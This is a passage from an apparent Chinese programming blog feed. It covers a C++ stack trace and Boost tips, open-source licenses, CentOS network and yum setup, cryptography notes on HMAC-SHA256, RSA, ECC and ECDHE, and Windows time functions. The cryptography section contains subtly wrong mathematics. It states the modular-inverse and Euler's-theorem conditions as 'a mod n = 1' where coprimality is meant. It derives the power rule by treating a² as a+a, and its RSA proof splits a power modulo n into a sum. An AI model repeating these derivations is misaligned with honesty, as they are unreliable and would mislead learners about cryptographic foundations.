(std::__future_base::_Async_state_impl&lt;std::thread::_Invoker&lt;std::tuple&lt;Test::Test()::&#123;lambda()#1&#125;&gt; &gt;, void&gt;::*&amp;&amp;)(), std::__future_base::_Async_state_impl&lt;std::thread::_Invoker&lt;std::tuple&lt;Test::Test()::&#123;lambda()#1&#125;&gt; &gt;, void&gt;*&amp;&amp;) at /usr/include/c++/12.1.1/bits/invoke.h:97</span><br><span class="line">23# void std::thread::_Invoker&lt;std::tuple&lt;void (std::__future_base::_Async_state_impl&lt;std::thread::_Invoker&lt;std::tuple&lt;Test::Test()::&#123;lambda()#1&#125;&gt; &gt;, void&gt;::*)(), std::__future_base::_Async_state_impl&lt;std::thread::_Invoker&lt;std::tuple&lt;Test::Test()::&#123;lambda()#1&#125;&gt; &gt;, void&gt;*&gt; &gt;::_M_invoke&lt;0ul, 1ul&gt;(std::_Index_tuple&lt;0ul, 1ul&gt;) at /usr/include/c++/12.1.1/bits/std_thread.h:252</span><br><span class="line">24# std::thread::_Invoker&lt;std::tuple&lt;void (std::__future_base::_Async_state_impl&lt;std::thread::_Invoker&lt;std::tuple&lt;Test::Test()::&#123;lambda()#1&#125;&gt; &gt;, void&gt;::*)(), std::__future_base::_Async_state_impl&lt;std::thread::_Invoker&lt;std::tuple&lt;Test::Test()::&#123;lambda()#1&#125;&gt; &gt;, void&gt;*&gt; &gt;::operator()() at /usr/include/c++/12.1.1/bits/std_thread.h:259</span><br><span class="line">25# std::thread::_State_impl&lt;std::thread::_Invoker&lt;std::tuple&lt;void (std::__future_base::_Async_state_impl&lt;std::thread::_Invoker&lt;std::tuple&lt;Test::Test()::&#123;lambda()#1&#125;&gt; &gt;, void&gt;::*)(), std::__future_base::_Async_state_impl&lt;std::thread::_Invoker&lt;std::tuple&lt;Test::Test()::&#123;lambda()#1&#125;&gt; &gt;, void&gt;*&gt; &gt; &gt;::_M_run() in build/output/run</span><br><span class="line">26# execute_native_thread_routine at /usr/src/debug/gcc/libstdc++-v3/src/c++11/thread.cc:84</span><br><span class="line">27# 0x00007FF52BDB778D in /usr/lib/libc.so.6</span><br><span class="line">28# __clone in /usr/lib/libc.so.6</span><br><span class="line">; Will: thread exit</span><br></pre></td></tr></table></figure>

<h2 id="boost-thread-pthread-thread-data-hpp"><a href="#boost-thread-pthread-thread-data-hpp" class="headerlink" title="boost&#x2F;thread&#x2F;pthread&#x2F;thread_data.hpp"></a>boost&#x2F;thread&#x2F;pthread&#x2F;thread_data.hpp</h2><h3 id="1-和系统时间无关的线程休眠"><a href="#1-和系统时间无关的线程休眠" class="headerlink" title="1. 和系统时间无关的线程休眠"></a>1. 和系统时间无关的线程休眠</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">boost::this_thread::<span class="built_in">sleep_for</span>(boost::chrono::<span class="built_in">seconds</span>(<span class="number">5</span>));</span><br></pre></td></tr></table></figure>

<h1 id="小技巧和踩坑记"><a href="#小技巧和踩坑记" class="headerlink" title="小技巧和踩坑记"></a>小技巧和踩坑记</h1><h2 id="1-下面接口不带ec会抛异常"><a href="#1-下面接口不带ec会抛异常" class="headerlink" title="1. 下面接口不带ec会抛异常"></a>1. 下面接口不带ec会抛异常</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">boost::asio::steady_timer::<span class="built_in">cancel</span>();</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Program</category>
        <category>C/C++</category>
      </categories>
  </entry>
  <entry>
    <title>有关开源的一些记录</title>
    <url>/blogs/2022-04-19-opensource/</url>
    <content><![CDATA[<h1 id="一、开源协议"><a href="#一、开源协议" class="headerlink" title="一、开源协议"></a>一、开源协议</h1><p>参考 <a href="https://zhuanlan.zhihu.com/p/80075905">五分钟看懂开源协议</a></p>
<h2 id="1-开源协议选择的原则"><a href="#1-开源协议选择的原则" class="headerlink" title="1. 开源协议选择的原则"></a>1. 开源协议选择的原则</h2><img src="2022-04-19-01.png" />

<ol>
<li>如果想省事，不关系别人用自己的代码去做什么，直接选 MIT 或者 BSD 就好</li>
<li>如果想代码修改以后做出声明，选择 Apache 协议</li>
<li>如果想“繁衍”后代，那么使用 GPL 协议</li>
</ol>
]]></content>
      <categories>
        <category>Program</category>
        <category>Common</category>
      </categories>
      <tags>
        <tag>open source</tag>
      </tags>
  </entry>
  <entry>
    <title>centos配置记录</title>
    <url>/blogs/2022-03-30-centos/</url>
    <content><![CDATA[<h1 id="一、系统配置"><a href="#一、系统配置" class="headerlink" title="一、系统配置"></a>一、系统配置</h1><h2 id="1-网络配置"><a href="#1-网络配置" class="headerlink" title="1. 网络配置"></a>1. 网络配置</h2><h3 id="1-1-配置网卡"><a href="#1-1-配置网卡" class="headerlink" title="1.1. 配置网卡"></a>1.1. 配置网卡</h3><ul>
<li>修改<code>/etc/sysconfig/network-scripts/ifcfg-xxx</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">TYPE=&quot;Ethernet&quot;</span><br><span class="line">PROXY_METHOD=&quot;none&quot;</span><br><span class="line">BROWSER_ONLY=&quot;no&quot;</span><br><span class="line">BOOTPROTO=&quot;none&quot;</span><br><span class="line">DEFROUTE=&quot;yes&quot;</span><br><span class="line">IPV4_FAILURE_FATAL=&quot;no&quot;</span><br><span class="line">IPADDR=&quot;199.200.2.199&quot;      # ipv4地址</span><br><span class="line">PREFIX=&quot;16&quot;                 # 掩码</span><br><span class="line">GATEWAY=&quot;199.200.2.254&quot;     # 默认网关</span><br><span class="line">DNS1=&quot;199.200.0.100&quot;        # dns地址</span><br><span class="line">IPV6INIT=&quot;yes&quot;</span><br><span class="line">IPV6_AUTOCONF=&quot;no&quot;          # 是否自动配置ipv6，关掉下面的ip配置才有效</span><br><span class="line">IPV6_DEFROUTE=&quot;yes&quot;</span><br><span class="line">IPV6_FAILURE_FATAL=&quot;no&quot;</span><br><span class="line">IPV6_ADDR_GEN_MODE=&quot;stable-privacy&quot;</span><br><span class="line">IPV6ADDR=&quot;2002::0011/112&quot;   # ipv6地址</span><br><span class="line">IPV6_PRIVACY=&quot;no&quot;</span><br><span class="line">IPV6_DEFAULTGW=&quot;1001::fffe&quot; # ipv6网关</span><br><span class="line">NAME=&quot;ens18&quot;</span><br><span class="line">UUID=&quot;c1a4c4b2-b705-44fb-9bec-a486f633d76d&quot; # 使用 nmcli con show</span><br><span class="line">DEVICE=&quot;ens18&quot;</span><br><span class="line">ONBOOT=&quot;yes&quot;</span><br></pre></td></tr></table></figure>

<h3 id="1-2-查看网卡信息"><a href="#1-2-查看网卡信息" class="headerlink" title="1.2. 查看网卡信息"></a>1.2. 查看网卡信息</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">=&gt; nmcli con show</span><br><span class="line">NAME   UUID                                  TYPE      DEVICE</span><br><span class="line">ens18  c1a4c4b2-b705-44fb-9bec-a486f633d76d  ethernet  ens18</span><br><span class="line">ens19  d808c1b2-fccf-3717-b518-4e3df1cc61a8  ethernet  --</span><br></pre></td></tr></table></figure>

<h3 id="1-3-防火墙"><a href="#1-3-防火墙" class="headerlink" title="1.3. 防火墙"></a>1.3. 防火墙</h3><ul>
<li>centos7使用firewalld管理防火墙，具体配置查看 <a href="/blogs/2018-09-16-shellStudy/#18-firewalld-%E9%98%B2%E7%81%AB%E5%A2%99">firewalld</a></li>
</ul>
<h1 id="二、软件安装"><a href="#二、软件安装" class="headerlink" title="二、软件安装"></a>二、软件安装</h1><h2 id="1-yum命令"><a href="#1-yum命令" class="headerlink" title="1. yum命令"></a>1. yum命令</h2><h3 id="1-1-开启安装debuginfo"><a href="#1-1-开启安装debuginfo" class="headerlink" title="1.1. 开启安装debuginfo"></a>1.1. 开启安装debuginfo</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum install &#x27;dnf-command(debuginfo-install)&#x27;</span><br></pre></td></tr></table></figure>

<ul>
<li>之后就可以使用下面命令安装对应的debuginfo的包</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">yum debuginfo-install xxx</span><br></pre></td></tr></table></figure>

<h2 id="2-部分命令安装源和包"><a href="#2-部分命令安装源和包" class="headerlink" title="2. 部分命令安装源和包"></a>2. 部分命令安装源和包</h2><h3 id="2-1-CentOS-7"><a href="#2-1-CentOS-7" class="headerlink" title="2.1. CentOS 7"></a>2.1. CentOS 7</h3><table>
<thead>
<tr>
<th>文件&#x2F;命令</th>
<th>所属包</th>
<th>所属仓库</th>
</tr>
</thead>
<tbody><tr>
<td>rpcgen</td>
<td>rpcgen</td>
<td>PowerTools</td>
</tr>
<tr>
<td><code>ncurses/curses.h</code></td>
<td>ncurses-devel</td>
<td>BaseOS</td>
</tr>
<tr>
<td>gdbserver</td>
<td>gdb-gdbserver</td>
<td>AppStream</td>
</tr>
</tbody></table>
<h2 id="3-包内容查看和搜索"><a href="#3-包内容查看和搜索" class="headerlink" title="3. 包内容查看和搜索"></a>3. 包内容查看和搜索</h2><ul>
<li>需要安装<code>yum-utils</code></li>
</ul>
<h3 id="3-1-查看包安装了哪些软件"><a href="#3-1-查看包安装了哪些软件" class="headerlink" title="3.1. 查看包安装了哪些软件"></a>3.1. 查看包安装了哪些软件</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">=&gt; repoquery -l texinfo</span><br><span class="line">Last metadata expiration check: 0:12:48 ago on Thu 21 Sep 2023 02:14:51 PM CST.</span><br><span class="line">/usr/bin/makeinfo</span><br><span class="line">/usr/bin/pod2texi</span><br><span class="line">/usr/bin/texi2any</span><br><span class="line">/usr/share/doc/texinfo</span><br><span class="line">/usr/share/doc/texinfo/AUTHORS</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<h3 id="3-2-根据文件搜索在哪个包中"><a href="#3-2-根据文件搜索在哪个包中" class="headerlink" title="3.2. 根据文件搜索在哪个包中"></a>3.2. 根据文件搜索在哪个包中</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">=&gt; repoquery &quot;*/ncurses/curses.h&quot;</span><br><span class="line">Last metadata expiration check: 0:14:13 ago on Thu 21 Sep 2023 02:14:51 PM CST.</span><br><span class="line">ncurses-devel-0:6.1-9.20180224.el8.i686</span><br><span class="line">ncurses-devel-0:6.1-9.20180224.el8.x86_64</span><br></pre></td></tr></table></figure>

<h1 id="小技巧和踩坑记"><a href="#小技巧和踩坑记" class="headerlink" title="小技巧和踩坑记"></a>小技巧和踩坑记</h1><h2 id="1-CentOS-7安装cmake后提示cmake-symbol-lookup-error-cmake-undefined-symbol-archive-write-add-filter-zstd"><a href="#1-CentOS-7安装cmake后提示cmake-symbol-lookup-error-cmake-undefined-symbol-archive-write-add-filter-zstd" class="headerlink" title="1. CentOS 7安装cmake后提示cmake: symbol lookup error: cmake: undefined symbol: archive_write_add_filter_zstd"></a>1. CentOS 7安装cmake后提示<code>cmake: symbol lookup error: cmake: undefined symbol: archive_write_add_filter_zstd</code></h2><ul>
<li>安装<code>libarchive</code>即可</li>
</ul>
]]></content>
      <categories>
        <category>Program</category>
        <category>Shell</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>密码学原理和实现（go版本）笔记</title>
    <url>/blogs/2022-03-23-cryptography/</url>
    <content><![CDATA[<h1 id="一、名词解释"><a href="#一、名词解释" class="headerlink" title="一、名词解释"></a>一、名词解释</h1><h2 id="1-HMAC"><a href="#1-HMAC" class="headerlink" title="1. HMAC"></a>1. HMAC</h2><p><strong>全称</strong></p>
<ul>
<li>Hash-based Message Authentication Code</li>
<li>散列消息认证码</li>
</ul>
<p><strong>说明</strong></p>
<ul>
<li>使用密码散列函数，结合加密密钥，计算成的消息认证码，主要用于保证数据完整性，同时作为消息的身份认证</li>
</ul>
<h2 id="2-SHA256"><a href="#2-SHA256" class="headerlink" title="2. SHA256"></a>2. SHA256</h2><p><strong>全称</strong></p>
<ul>
<li>Secure Hash Algorithm 256</li>
<li>安全散列算法256</li>
</ul>
<p><strong>说明</strong></p>
<ul>
<li>散列函数的一种，对任意长度的数字，计算一个32byte（256bit）的字符串（message digest）</li>
</ul>
<h2 id="3-RSA"><a href="#3-RSA" class="headerlink" title="3. RSA"></a>3. RSA</h2><p><strong>全称</strong></p>
<ul>
<li>Rivest-Shamir-Adleman</li>
<li>三个人提出的一种加解密算法</li>
</ul>
<p><strong>说明</strong></p>
<ul>
<li>使用不同的加密密钥和解密密钥</li>
<li>已知加密密钥无法推导出解密密钥</li>
</ul>
<h1 id="二、基本数学知识"><a href="#二、基本数学知识" class="headerlink" title="二、基本数学知识"></a>二、基本数学知识</h1><h2 id="1-gcd-最大公约数"><a href="#1-gcd-最大公约数" class="headerlink" title="1. gcd 最大公约数"></a>1. gcd 最大公约数</h2><p><strong>全称</strong></p>
<ul>
<li>Greatest Common Divisor</li>
</ul>
<h2 id="2-互质关系"><a href="#2-互质关系" class="headerlink" title="2. 互质关系"></a>2. 互质关系</h2><p><strong>概念</strong></p>
<p>两个数的最大公约数是1，就是互质关系</p>
<p><strong>说明</strong></p>
<ul>
<li>任意两个质数构成互质关系，比如13和61。</li>
<li>一个数是质数，另一个数只要不是前者的倍数，两者就构成互质关系，比如3和10。</li>
<li>如果两个数之中，较大的那个数是质数，则两者构成互质关系，比如97和57。</li>
<li>1和任意一个自然数是都是互质关系，比如1和99。</li>
<li>p是大于1的整数，则p和p-1构成互质关系，比如57和56。</li>
<li>p是大于1的奇数，则p和p-2构成互质关系，比如17和15。</li>
</ul>
<h2 id="3-余数的几个定理"><a href="#3-余数的几个定理" class="headerlink" title="3. 余数的几个定理"></a>3. 余数的几个定理</h2><h3 id="3-1-a-mod-n-mod-n-a-mod-n"><a href="#3-1-a-mod-n-mod-n-a-mod-n" class="headerlink" title="3.1. $(a\ mod\ n)\ mod\ n &#x3D; a\ mod\ n$"></a>3.1. $(a\ mod\ n)\ mod\ n &#x3D; a\ mod\ n$</h3><ul>
<li>很好理解，取了余数后再取余数肯定还是自己</li>
</ul>
<h3 id="3-2-a-b-mod-n-a-mod-n-b-mod-n-mod-n"><a href="#3-2-a-b-mod-n-a-mod-n-b-mod-n-mod-n" class="headerlink" title="3.2. $(a+b)\ mod\ n &#x3D; (a\ mod\ n+b\ mod\ n)\ mod\ n$"></a>3.2. $(a+b)\ mod\ n &#x3D; (a\ mod\ n+b\ mod\ n)\ mod\ n$</h3><ul>
<li>设 $a &#x3D; k_1n+c_1$ ， $b &#x3D; k_2n+c_2$</li>
</ul>
<p>$$ (a+b)\ mod\ n &#x3D; [(k_1 + k_2)n + c_1 + c_2]\ mod\ n &#x3D; (c_1 + c_2)\ mod\ n &#x3D; (a\ mod\ n+b\ mod\ n)\ mod\ n $$</p>
<h3 id="3-3-a-k-mod-n-a-mod-n-k-mod-n"><a href="#3-3-a-k-mod-n-a-mod-n-k-mod-n" class="headerlink" title="3.3. $a^k\ mod\ n &#x3D; (a\ mod\ n)^k\ mod\ n$"></a>3.3. $a^k\ mod\ n &#x3D; (a\ mod\ n)^k\ mod\ n$</h3><ul>
<li>由上面的 $(a+b)\ mod\ n &#x3D; (a\ mod\ n+b\ mod\ n)\ mod\ n$ 就可以直接推出来</li>
</ul>
<p>$$ a^2\ mod\ n &#x3D; (a+a)\ mod\ n &#x3D; (a\ mod\ n+a\ mod\ n)\ mod\ n &#x3D; (a\ mod\ n)^2\ mod\ n $$</p>
<h2 id="4-a-equiv-1-mod-n"><a href="#4-a-equiv-1-mod-n" class="headerlink" title="4. $a \equiv 1 (mod\ n)$"></a>4. $a \equiv 1 (mod\ n)$</h2><p>代表 $a\ mod\ n &#x3D; 1$</p>
<h2 id="5-模反元素"><a href="#5-模反元素" class="headerlink" title="5. 模反元素"></a>5. 模反元素</h2><p>如果 $a\ mod\ n &#x3D; 1$ 那么一定可以找到一个整数b满足 $ab\ mod\ n &#x3D; 1$，那么b就是a的模反元素</p>
<h2 id="6-欧拉函数"><a href="#6-欧拉函数" class="headerlink" title="6. 欧拉函数"></a>6. 欧拉函数</h2><p>定义 $\varphi(n)$ 为小于n的，与n互质的正整数个数，几个特例如下</p>
<ul>
<li>当n为质数 $\varphi(n) &#x3D; n-1$</li>
</ul>
<h2 id="7-欧拉定理"><a href="#7-欧拉定理" class="headerlink" title="7. 欧拉定理"></a>7. 欧拉定理</h2><p>如果 $a\ mod\ n &#x3D; 1$ 那么一定有 $a^{\varphi(n)}\ mod\ n &#x3D; 1$</p>
<h2 id="8-费马小定理"><a href="#8-费马小定理" class="headerlink" title="8. 费马小定理"></a>8. 费马小定理</h2><p>如果p是质数，且a不是p的倍数，则有 $a^{p-1}\ mod\ p &#x3D; 1$</p>
<ul>
<li>证明很简单，就是p是质数的情况下， $\varphi(p) &#x3D; p-1$</li>
<li>由欧拉定理得证</li>
</ul>
<h1 id="三、算法描述和实现"><a href="#三、算法描述和实现" class="headerlink" title="三、算法描述和实现"></a>三、算法描述和实现</h1><h2 id="1-HMAC-SHA256-摘要算法"><a href="#1-HMAC-SHA256-摘要算法" class="headerlink" title="1. HMAC-SHA256: 摘要算法"></a>1. HMAC-SHA256: 摘要算法</h2><ul>
<li>使用SHA256生成hash值的HMAC算法</li>
</ul>
<h3 id="1-1-算法步骤"><a href="#1-1-算法步骤" class="headerlink" title="1.1. 算法步骤"></a>1.1. 算法步骤</h3><p>摘自<a href="https://blog.csdn.net/sdnyqfyqf/article/details/105534376">从零入门HMAC-SHA256</a></p>
<img src="2022-03-23-01.png" />

<ol>
<li>密钥填充。若密钥比SHA-256算法的分组长度B（512-bit）短，则需在末尾填充0，直到其长度达到单向散列函数的分组长度为止。若密钥比分组长度长，则要用SHA-256算法求出密钥的散列值，然后将这个散列值作为新的密钥；</li>
<li>内部填充。将填充后的密钥与被称为ipad的序列进行异或运算，所形成的值为ipadkey。ipad是将00110110这一序列不断循环反复直到达到分组长度；</li>
<li>与消息组合。将ipadkey与消息组合，也就是将ipadkey附加在消息的开头。</li>
<li>计算散列值。将3的结果输入SHA-256函数，并计算出散列值。</li>
<li>外部填充。将填充后的密钥与被称为opad的序列进行异或运算，所形成的值为opadkey。opad是将01011100这一序列不断循环反复直到达到分组长度。</li>
<li>与散列值组合。将4的散列值拼在opadkey后面。</li>
<li>计算散列值。将6的结果输入SHA-256函数，并计算出散列值，这个散列值就是最终的摘要内容。</li>
</ol>
<h3 id="1-2-go的上层实现"><a href="#1-2-go的上层实现" class="headerlink" title="1.2. go的上层实现"></a>1.2. go的上层实现</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;crypto/hmac&quot;</span></span><br><span class="line">	<span class="string">&quot;crypto/sha256&quot;</span></span><br><span class="line">	<span class="string">&quot;encoding/hex&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	key := <span class="string">&quot;aaaaa&quot;</span></span><br><span class="line">    str_to_sign := <span class="string">&quot;bbbb&quot;</span></span><br><span class="line"></span><br><span class="line">	sig := hmac.New(sha256.New, []<span class="type">byte</span>(key))</span><br><span class="line">	sig.Write([]<span class="type">byte</span>(str_to_sign))</span><br><span class="line">	fmt.Println(hex.EncodeToString(sig.Sum(<span class="literal">nil</span>)))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="2-RSA算法-非对称加解密"><a href="#2-RSA算法-非对称加解密" class="headerlink" title="2. RSA算法: 非对称加解密"></a>2. RSA算法: 非对称加解密</h2><ul>
<li>参考自 <a href="https://zhuanlan.zhihu.com/p/48249182">RSA算法原理</a></li>
</ul>
<h3 id="2-1-算法原理"><a href="#2-1-算法原理" class="headerlink" title="2.1. 算法原理"></a>2.1. 算法原理</h3><ol>
<li>任意选取两个不同的大素数 $p$ 和 $q$，计算得到 $n &#x3D; pq, \varphi(n) &#x3D; (p-1)(q-1)$</li>
<li>选取一个大整数 $e$ 作为<strong>加密密钥</strong>，满足 $gcd(e, \varphi(n))&#x3D;1$，所有大于 $p$ 和 $q$ 的素数都可用做 $e$</li>
<li>确定 $d$ 作为<strong>解密密钥</strong>，满足 $(de)\ mod\ \varphi(n) &#x3D; 1$，即 $de &#x3D; k\varphi(n) + 1, k \ge 1$，所以，知道 $e$ 和 $\varphi(n)$ 很容易计算出d</li>
<li>公开整数 $n$ 和 $e$，保存 $d$</li>
<li>将明文 $m$ 加密成密文 $c$，算法为 $c &#x3D; E(m) &#x3D; m^e\ mod\ n$</li>
<li>密文 $c$ 解密成明文 $m$，算法为 $m &#x3D; D(c) &#x3D; c^d\ mod\ n$</li>
<li>要求要计算的数据m必须满足 $0 \le m \lt n$</li>
</ol>
<h3 id="2-2-密钥安全性"><a href="#2-2-密钥安全性" class="headerlink" title="2.2. 密钥安全性"></a>2.2. 密钥安全性</h3><ul>
<li>给出n无法很快因式分解出p和q，那么就算不出 $\varphi(n) &#x3D; (p-1)(q-1)$</li>
<li>没有 $\varphi(n)$ ，只有e无法算出d，也就是无法算出私钥，所以私钥是安全的</li>
</ul>
<h3 id="2-3-算法证明"><a href="#2-3-算法证明" class="headerlink" title="2.3. 算法证明"></a>2.3. 算法证明</h3><ul>
<li>就是要证明 $m &#x3D; c^d\ mod\ n &#x3D; (m^e\ mod\ n)^d\ mod\ n$</li>
<li>由余数的几个运算性质得</li>
</ul>
<p>$$ (m^e\ mod\ n)^d\ mod\ n &#x3D; m^{ed}\ mod\ n $$</p>
<ul>
<li>由 $ed\ mod\ \varphi(n) &#x3D; 1$ 推出 $ed &#x3D; k\varphi(n) + 1$</li>
</ul>
<p>$$ m^{ed}\ mod\ n &#x3D; m^{k\varphi(n) + 1}\ mod\ n $$</p>
<ul>
<li>加解密的原理的关键就是要证明</li>
</ul>
<p>$$ m^{k\varphi(n) + 1}\ mod\ n &#x3D; m $$</p>
<h4 id="1-当m和n互质"><a href="#1-当m和n互质" class="headerlink" title="1) 当m和n互质"></a>1) 当m和n互质</h4><ul>
<li>由欧拉定理得到 $m^{\varphi(n)}\ mod\ n &#x3D; 1$</li>
</ul>
<p>$$ m^{k\varphi(n) + 1}\ mod\ n &#x3D; m^{k\varphi(n)}\ mod\ n + m\ mod\ n &#x3D; (m^{\varphi(n)}\ mod\ n)^k + m &#x3D; 1^k + m &#x3D; m $$</p>
<h4 id="2-当m和n不互质"><a href="#2-当m和n不互质" class="headerlink" title="2) 当m和n不互质"></a>2) 当m和n不互质</h4><ul>
<li>由于 $n &#x3D; pq，m \lt n$ 而p和q互质，那么m只能是p或者q的倍数，就假设是p的倍数</li>
<li>由于m是p的倍数，且 $m &lt; n &#x3D; pq$，那么m一定和q互质，所以 $m^{\varphi(q)}\ mod\ q  &#x3D; 1$，而 $\varphi(n) &#x3D; (p-1)(q-1)$，那么有</li>
</ul>
<p>$$ m^{k\varphi(n)}\ mod\ q &#x3D; m^{k(p-1)(q-1)}\ mod\ q &#x3D; (m^{q-1}\ mod\ q)^{k(p-1)}\ mod\ q &#x3D; 1^{k(p-1)}\ mod\ q &#x3D; 1 $$</p>
<ul>
<li>此式可以推出 $m^{k\varphi(n)} &#x3D; k_1 q + 1$，且设 $m &#x3D; k_2 p$</li>
</ul>
<p>$$<br>\begin{aligned}<br>    m^{k\varphi(n)} &amp; &#x3D; k_1 q + 1 \\<br>    m^{k\varphi(n)} \times m &amp; &#x3D; k_1 q \times m + m \\<br>    m^{k\varphi(n) + 1} &amp; &#x3D; k_1 q \times k_2 p + m \\<br>    m^{k\varphi(n) + 1} &amp; &#x3D; k_1k_2 n + m<br>\end{aligned}<br>$$</p>
<ul>
<li>正好可以证明 $m^{k\varphi(n) + 1}\ mod\ n &#x3D; m$</li>
</ul>
<h2 id="3-ECC算法-非对称加解密算法"><a href="#3-ECC算法-非对称加解密算法" class="headerlink" title="3. ECC算法: 非对称加解密算法"></a>3. ECC算法: 非对称加解密算法</h2><p>参考 <a href="https://zhuanlan.zhihu.com/p/101907402">椭圆曲线加密算法（ECC）</a></p>
<h3 id="3-1-算法原理"><a href="#3-1-算法原理" class="headerlink" title="3.1. 算法原理"></a>3.1. 算法原理</h3><ul>
<li>选取椭圆曲线的一个点G，生成一个私钥d，然后公开G和 $Q &#x3D; dG$作为公钥</li>
</ul>
<p><strong>加解密</strong></p>
<ul>
<li>加密过程是先选取一个随机数r，将明文m使用公钥G和Q加密生成密文： $\{rG, m+rx_Q\}$</li>
<li>解密就是使用私钥d计算，先计算 $rG \times d &#x3D; rdG &#x3D; rQ$，然后就有</li>
</ul>
<p>$$m + r x_Q - r x_Q &#x3D; M$$</p>
<p><strong>签名验签</strong></p>
<ul>
<li>签名过程是使用私钥签名，选择随机数r，生成一个点 $rG&#x3D;(x, y)$</li>
<li>生成明文M的摘要h的签名： $\{rG, \frac{h+x_{rG}d}{r}\}$</li>
<li>验签使用公钥和摘要h计算：</li>
</ul>
<p>$$ \frac{h}{\frac{h+x_{rG}d}{r}}G + \frac{x_{rG}}{\frac{h+x_{rG}d}{r}}Q &#x3D; \frac{hr}{h+x_{rG}d}G + \frac{x_{rG}rd}{h+x_{rG}d}G &#x3D; \frac{(h+x_{rG}d)r}{h+x_{rG}d}G &#x3D; rG $$</p>
<ul>
<li>和rG对比即可验签通过</li>
</ul>
<h2 id="4-ECDHE算法-密钥交换算法"><a href="#4-ECDHE算法-密钥交换算法" class="headerlink" title="4. ECDHE算法: 密钥交换算法"></a>4. ECDHE算法: 密钥交换算法</h2><h3 id="4-1-算法原理"><a href="#4-1-算法原理" class="headerlink" title="4.1. 算法原理"></a>4.1. 算法原理</h3><ul>
<li>通俗来讲，就是定义了一个椭圆曲线上两个点加法的运算，得到的结果也是椭圆曲线上的一个点</li>
<li>由于椭圆曲线上此加法满足交换律、结合律</li>
<li>离散域里面将椭圆曲线和mod结合起来，还是满足交换律和结合律</li>
<li>私钥就是随机选择的一个数d，确定椭圆曲线和椭圆曲线的基点G，公钥就满足</li>
</ul>
<p>$$<br>Q &#x3D; G + G + … + G &#x3D; dG<br>$$</p>
<ul>
<li>两个端分别有 $d_1$ 和 $d_2$，分别基于G算出 $Q_1$ 和 $Q_2$，满足下面的式子</li>
</ul>
<p>$$<br>d_1Q_2 &#x3D; d_1d_2G &#x3D; d_2d_1G &#x3D; d_2Q_1<br>$$</p>
<ul>
<li>两边使用对方的公钥和自己的私钥就可以计算出一个共同的点<code>(x, y)</code>，其中的x是一样的，这样的x就可以作为对称加密密钥</li>
</ul>
<h3 id="4-2-如何保证私钥安全"><a href="#4-2-如何保证私钥安全" class="headerlink" title="4.2. 如何保证私钥安全"></a>4.2. 如何保证私钥安全</h3><ul>
<li>对外暴露的只有G和 $Q &#x3D; dG$ ，使用Q和G去计算d需要算好久好久，基本需要一个一个尝试d</li>
<li>而知道d和G计算dQ则很简单，可以直接使用倍加的方式，即使用 $x \times G + x \times G&#x3D;2x \times G$ 的原理</li>
<li>将d按照二进制分解，从最高位开始算，每遍历一位，结果加上自己（也就是乘2），此位如果是1，结果加上G</li>
<li>d和G计算dG只需要 $O(\log_2,d)$ ，而Q和G计算d则需要 $O(d)$ 的时间复杂度</li>
<li>假设d是256位，那么计算dG则是256个单位时间，而计算d则需要 $2^{256}$ 个单位时间</li>
</ul>
]]></content>
      <categories>
        <category>Program</category>
        <category>go</category>
      </categories>
  </entry>
  <entry>
    <title>windows系统相关的总结</title>
    <url>/blogs/2022-03-22-windows/</url>
    <content><![CDATA[<h1 id="一、系统知识"><a href="#一、系统知识" class="headerlink" title="一、系统知识"></a>一、系统知识</h1><h1 id="二、windows编程"><a href="#二、windows编程" class="headerlink" title="二、windows编程"></a>二、windows编程</h1><h2 id="1-网络编程"><a href="#1-网络编程" class="headerlink" title="1. 网络编程"></a>1. 网络编程</h2><h3 id="1-1-工具函数"><a href="#1-1-工具函数" class="headerlink" title="1.1. 工具函数"></a>1.1. 工具函数</h3><h4 id="1-网络字节序转换"><a href="#1-网络字节序转换" class="headerlink" title="1) 网络字节序转换"></a>1) 网络字节序转换</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">// #include &lt;WinSock2.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">uint32_t</span> <span class="title">ntohl</span> <span class="params">(<span class="type">uint32_t</span> __netlong)</span></span>;</span><br><span class="line"><span class="function"><span class="type">uint16_t</span> <span class="title">ntohs</span> <span class="params">(<span class="type">uint16_t</span> __netshort)</span></span>;</span><br><span class="line"><span class="function"><span class="type">uint32_t</span> <span class="title">htonl</span> <span class="params">(<span class="type">uint32_t</span> __hostlong)</span></span>;</span><br><span class="line"><span class="function"><span class="type">uint16_t</span> <span class="title">htons</span> <span class="params">(<span class="type">uint16_t</span> __hostshort)</span></span>;</span><br></pre></td></tr></table></figure>

<h4 id="2-时间函数"><a href="#2-时间函数" class="headerlink" title="2) 时间函数"></a>2) 时间函数</h4><p><a href="https://www.cnblogs.com/kex1n/p/3297607.html">windows平台时间函数性能比较QueryPerformanceCounter，GetTickCount，ftime，time,GetLocalTime，GetSystemTimeAsFileTime</a></p>
<table>
<thead>
<tr>
<th></th>
<th>用途</th>
<th>精度</th>
<th>耗时比（不精确）</th>
</tr>
</thead>
<tbody><tr>
<td>GetTickCount</td>
<td>系统启动时间</td>
<td>1ms</td>
<td>26</td>
</tr>
<tr>
<td>GetSystemTimeAsFileTime</td>
<td>系统时间(UTC)</td>
<td>100ns</td>
<td>39</td>
</tr>
<tr>
<td>GetLocalTime</td>
<td>系统时间(本地时区)</td>
<td>100ns</td>
<td>1722</td>
</tr>
<tr>
